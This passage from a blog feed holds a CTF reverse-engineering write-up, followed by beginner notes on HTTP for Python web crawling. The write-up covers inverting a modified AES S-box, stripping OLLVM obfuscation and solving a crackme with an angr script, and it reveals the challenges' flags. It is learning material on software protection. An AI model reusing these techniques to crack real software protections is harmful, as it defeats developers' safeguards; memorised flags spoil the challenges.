punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x8e</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">,</span> <span class="token number">0xce</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xdf</span><span class="token punctuation">,</span>    <span class="token number">0x8c</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xbb</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">]</span>new_s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>             <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span>             <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>             <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span>             <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>             <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span>             <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span>             <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span>             <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span>             <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span>             <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span>             <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span>             <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>             <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span>             <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">]</span>new_contrary_sbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token punctuation">(</span>new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span>    rol <span class="token operator">=</span> new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>    new_contrary_sbox<span class="token punctuation">[</span><span class="token punctuation">(</span>line <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> rol<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>new_contrary_sbox<span class="token punctuation">)</span>IInput <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'B0CC93EAE92FEF5699396E023B4F9E42'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>Cipher_Key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">b'user01_nkctf2024'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Cipher_Key<span class="token punctuation">)</span>Out <span class="token operator">=</span> IAES<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IAES<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> Cipher_Key<span class="token punctuation">,</span>new_contrary_sbox<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="reez复现"><a class="markdownIt-Anchor" href="#reez复现"></a> REEZ(复现)</h2><p><a href="https://www.cnblogs.com/huhuf6/p/14010717.html">OLLVM简单入门 - huhuf6 - 博客园 (cnblogs.com)</a></p><p>这道题目一堆很奇怪的数字，其实是</p><p>外面一层 ollvm 的壳，d810 去一下混淆，分析一下可以看出来是 rc4 解密了一个 elf 文件然后调用</p><p>134928</p><p>如何获得outputfile呢？在rm./outputfile函数打个断点，然后dump出来</p><p>135033</p><p>用ida打开看看</p><p>135100</p><p>这一坨</p><p>都是线性方程组求解，可以直接用z3梭，但是代码工作量太大了</p><p>看到可以用angr来跑</p><p>学习一下angr</p><p><a href="https://www.cnblogs.com/Node-Sans-Blog/p/14403013.html">angr 符号执行爆破 CTF-RE 入门 - Node_Sans - 博客园 (cnblogs.com)</a></p><p><a href="https://github.com/anhkgg/angr-doc-zh_CN">anhkgg/angr-doc-zh_CN: angr中文版文档 (github.com)</a></p><p>借鉴了一下大佬的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 二进制文件路径</span>    path_to_binary <span class="token operator">=</span> <span class="token string">r"C:\Users\Npc\Desktop\outputfile"</span>        <span class="token comment"># 从二进制文件创建 angr 项目</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>        <span class="token comment"># 创建符号执行的初始状态</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span>        add_options<span class="token operator">=</span><span class="token punctuation">&#123;</span>angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class="token punctuation">,</span>                     angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>        <span class="token comment"># 创建一个仿真管理器来管理符号执行</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># 定义一个函数来检查状态是否达到成功条件</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> stdout_output <span class="token operator">==</span> <span class="token string">b"D0_y0u_Like_What_You_See?\nWhat can I say? You are so great!"</span>    <span class="token comment"># 定义一个函数来检查状态是否应该中止</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> stdout_output <span class="token operator">==</span> <span class="token string">b"You are wrong!"</span>    <span class="token comment"># 探索程序的执行路径以找到成功条件，同时避免中止条件</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token comment"># 如果找到解决方案，则打印解决方案</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 如果未找到解决方案，则引发异常</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'未找到解决方案'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 当脚本运行时执行主函数</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">##NKCTF&#123;THut_1Ss_s@_eAsyhh&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-web笔记</title>
      <link href="/2024/03/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> <strong>introduction</strong></h1><p>学习python爬虫的笔记</p><h1 id="basics"><a class="markdownIt-Anchor" href="#basics"></a> <strong>basics</strong></h1><h2 id="web-basics"><a class="markdownIt-Anchor" href="#web-basics"></a> <strong>Web-basics</strong></h2><h3 id="url"><a class="markdownIt-Anchor" href="#url"></a> <strong>url</strong></h3><blockquote><p>scheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]</p><ul><li><strong>scheme</strong>:协议，eg：http;https;ftp  也称作protocol</li><li>username,password:用户,密码  有的url需要提供用户名和密码才能访问</li><li><strong>hostname</strong>:IP</li><li><strong>port</strong>:端口</li><li><strong>path</strong>路径，资源在服务器中的指定地址</li><li>parameters:参数不常用</li><li>query:查询  查询某种资源</li><li>fragment:片段  对资源描述的部分补充,相当于资源内部的书签:可用作单页面路由或者HTML锚点</li></ul></blockquote><h3 id="httphttps"><a class="markdownIt-Anchor" href="#httphttps"></a> <strong>http,https</strong></h3><p>http1.0/http1.1:目前的正式标准广泛使用，持久连接，节约宽带，管道机制，分块传输编码</p><p>http2.0:多路复用，服务器推送，头信息压缩，二进制协议，逐渐覆盖市场</p><p>https:http下加入SSL层进行加密，主打一个安全</p><h3 id="request"><a class="markdownIt-Anchor" href="#request"></a> <strong>request</strong></h3><h4 id="request-method"><a class="markdownIt-Anchor" href="#request-method"></a> <strong>request-method</strong></h4><ul><li><strong>GET</strong> 请求中的参数包含在url中，数据可以在url中看到，最多提交1024字节</li><li><strong>POST</strong> 请求的URL不会包含这些数据，数据通过表达传输，包含在请求体中</li><li>HEAD 类似于GET请求，但是返回的响应中没有具体内容，用于获取报头</li><li>PUT 用客户端传向服务器的数据取代指定文档中的内容</li><li>DELETE 请求服务器删除指定的页面</li><li>CONNECT 把服务器当跳板，让服务器代替客户端访问其他网页</li><li>OPTIONS 允许客户端查看服务器性能</li><li>TRACE 回显服务器收到的请求，主要用于测试或者诊断</li></ul><h4 id="request-head"><a class="markdownIt-Anchor" href="#request-head"></a> <strong>request-head</strong></h4><blockquote><p>Accept:请求报头域，用于指定客户端可以接受哪些类型信息</p><p>Accept-Language:指定客户端可接受的语言类型</p><p>Accept-Encoding:指定客户端可解搜的内容编码</p><p>Host: 用于指定请求资源的主机IP和端口号</p><p>Cookie: 或写作Cookies，为了辨别用户，进行会话跟踪而存储在用户本地的数据,主要功能是维持当前访问会话，保存登录信息</p><p>Referer: 用于标识请求从哪个页面发过来的，用作来源统计或者防盗链处理</p><p>User-Agent:UA头，使服务器识别客户端使用的操作系统及版本，浏览器及版本等信息，爬虫凭此可伪装成浏览器</p><p>Content-Type: 互联网媒体类型，text/html代表html格式，image/git代表gif图片，application/json 代表json类型</p><p>Upgrade-Insecure-Requests:一个请求首部，用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应，并且它可以成功处理 upgrade-insecure-requests CSP (en-US) 指令。</p><p>Sec-Fetch-*:<a href="https://juejin.cn/post/6888119172144824327">Sec-Fetch-*请求头，了解下? - 掘金 (juejin.cn)</a></p></blockquote><p>eg：访问baidu.com的请求头</p><p>1528</p><h4 id="request-body"><a class="markdownIt-Anchor" href="#request-body"></a> <strong>request-body</strong></h4><blockquote><p>GET:请求体为空</p><p>POST: 数据在请求体中，数据以内容表单数据的形式提交给服务器。requestheader的Content-Type 为 application/x-www-form-urlencoded POST提交数据方式为:表达数据  multipart/form-data 表单文件上传 application/json 序列化json数据 text/xml XML表单数据</p></blockquote><h3 id="response"><a class="markdownIt-Anchor" href="#response"></a> <strong>response</strong></h3><h4 id="status-code"><a class="markdownIt-Anchor" href="#status-code"></a> <strong>status-code</strong></h4><pre class="line-numbers language-none"><code class="language-none">2XX 成功200 ok（请求成功）204 no content （请求成功，但是没有结果返回）206 partial content （客户端请求一部分资源，服务端成功响应，返回一范围资源）3XX 重定向301 move permanently （永久性重定向）302 found （临时性重定向）303 see other （示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源）304 not modified （表示在客户端采用带条件的访问某资源时，服务端找到了资源，但是这个请求的条件不符合。跟重定向无关）307 temporary redirect （跟302一个意思）4XX 客户端错误400 bad request （请求报文存在语法错误）401 unauthorized （需要认证（第一次返回）或者认证失败（第二次返回））403 forbidden （请求被服务器拒绝了）404 not found （服务器上无法找到请求的资源）5XX 服务器错误500 internal server error （服务端执行请求时发生了错误）503 service unavailable （服务器正在超负载或者停机维护，无法处理请求）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他不常见的请见<a 